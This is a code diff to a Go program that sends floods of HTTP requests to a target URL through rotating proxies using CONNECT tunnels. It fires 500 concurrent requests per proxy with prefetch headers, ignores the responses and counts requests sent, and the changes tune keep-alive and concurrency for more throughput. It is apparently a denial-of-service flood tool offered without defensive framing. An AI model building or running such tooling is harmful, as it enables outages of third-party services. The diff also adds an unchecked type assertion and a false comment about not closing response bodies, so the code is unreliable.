@@ -1,10 +1,9 @@
 package main
-// 2
+
 import (
     "crypto/tls"
     "flag"
     "fmt"
-    "io/ioutil"
     "log"
     "math/rand"
     "net"
@@ -146,7 +145,7 @@ func sendRequest(proxyAddr, target string) {
         return
     }
 
-    dialer := &net.Dialer{Timeout: 3 * time.Second}
+    dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
     conn, err := dialer.Dial("tcp", proxyAddr)
     if err != nil {
         atomic.AddUint64(&errorCount, 1)
@@ -154,7 +153,7 @@ func sendRequest(proxyAddr, target string) {
     }
     defer conn.Close()
 
-    fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s\r\n\r\n", parsedURL.Host, parsedURL.Host)
+    fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n", parsedURL.Host, parsedURL.Host)
     buf := make([]byte, 4096)
     n, err := conn.Read(buf)
     if err != nil || !strings.Contains(string(buf[:n]), "200") {
@@ -162,15 +161,18 @@ func sendRequest(proxyAddr, target string) {
         return
     }
 
+    rawConn, _ := conn.(*net.TCPConn)
+    rawConn.SetKeepAlive(true)
+    rawConn.SetKeepAlivePeriod(30 * time.Second)
+
     client := clientPool.Get().(*http.Client)
     defer clientPool.Put(client)
 
-    requestChan := make(chan *http.Request, 500)
     var wg sync.WaitGroup
-
-    // Producer goroutine
-    go func() {
-        for i := 0; i < 500; i++ {
+    for i := 0; i < 500; i++ {
+        wg.Add(1)
+        go func() {
+            defer wg.Done()
             headers := map[string]string{
                 "sec-purpose":               "prefetch;prerender",
                 "purpose":                   "prefetch",
@@ -190,30 +192,19 @@ func sendRequest(proxyAddr, target string) {
             req, err := http.NewRequest(method, target+path, nil)
             if err != nil {
                 atomic.AddUint64(&errorCount, 1)
-                continue
+                return
             }
             for k, v := range headers {
                 req.Header.Set(k, v)
             }
-            requestChan <- req
-        }
-        close(requestChan)
-    }()
-
-    // Consumer goroutines
-    for i := 0; i < 10; i++ {
-        wg.Add(1)
-        go func() {
-            defer wg.Done()
-            for req := range requestChan {
-                atomic.AddUint64(&requestCount, 1)
-                go func(r *http.Request) {
-                    _, _ = client.Do(r)
-                }(req)
+            atomic.AddUint64(&requestCount, 1)
+            _, err = client.Do(req) // Removed response handling
+            if err != nil {
+                atomic.AddUint64(&errorCount, 1)
             }
+            // No resp.Body.Close() needed since we're not processing the response
         }()
     }
-
     wg.Wait()
 }
 
